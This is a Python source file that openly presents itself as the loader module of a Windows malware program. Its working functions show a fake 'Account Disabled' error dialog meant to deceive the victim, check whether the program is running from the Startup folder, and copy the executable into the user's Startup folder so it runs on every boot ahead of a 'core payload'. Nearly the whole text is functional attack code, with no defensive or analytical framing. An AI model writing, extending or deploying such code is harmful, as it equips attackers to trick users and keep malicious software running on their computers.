"""
Module: Deployment & Persistence (The Loader)
Description: Manages the application's lifecycle and environment. 
             Responsible for installation, persistence (Startup), and 
             social engineering camouflage (Decoy UI). 
             It prepares the environment for the core payload to run.
"""

import os
import shutil
import sys
import ctypes

def show_fake_error():
    """
    Displays a fake error message box to deceive the user.
    Simulates the 'Account Disabled' scenario.
    """
    title = "Account Disabled"
    message = "Account is no longer active."
    
    # ctypes.windll.user32.MessageBoxW is the Unicode version of the Win32 API
    #0:this pop-up is a standalone window and doesn't "belong" to any other program.
    #0x10: the "Critical Error" icon (Red X)
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)

def is_running_from_startup():
    """
    Checks if the current script/exe is running from the Windows Startup folder.
    Returns: True if running from Startup, False otherwise.
    """
    try:
        # Get current path
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(sys.argv[0])
        
        current_folder = os.path.dirname(current_file)
        
        # Get Startup path
        # os.getenv('APPDATA'): finds the hidden user data folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )

        #os.path.abspath(sys.argv[0])  gets the exact full path of where the program is currently running from.
        return os.path.normpath(current_folder).lower() == os.path.normpath(startup_folder).lower()
        
    except Exception:
        return False

def install_persistence():
    """
    Copies the current executable/script to the Windows Startup folder
    to ensure it runs on every boot.
    """
    try:
        # Get the path of the file currently running
        # If frozen (compiled to exe, not running), use executable path. If script(regular .py):just a text, should point to main.py path.
        if getattr(sys, 'frozen', False):
            current_file = sys.executable #The actual executable file
        else:
            current_file = os.path.abspath(sys.argv[0])

        exe_name = os.path.basename(current_file)

        # Locate the Windows Startup folder, whici is located inside the hidden user data folder (AppData). 
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        
        destination = os.path.join(startup_folder, exe_name)

        # Check if already exists to avoid overwriting unnecessarily
        if not os.path.exists(destination):
            shutil.copy2(current_file, destination)
            print(f"[DEBUG] Persistence installed: {destination}")
        else:
            print("[DEBUG] Persistence already exists.")
            
    except Exception as e:
        print(f"[ERROR] Failed to install persistence: {e}")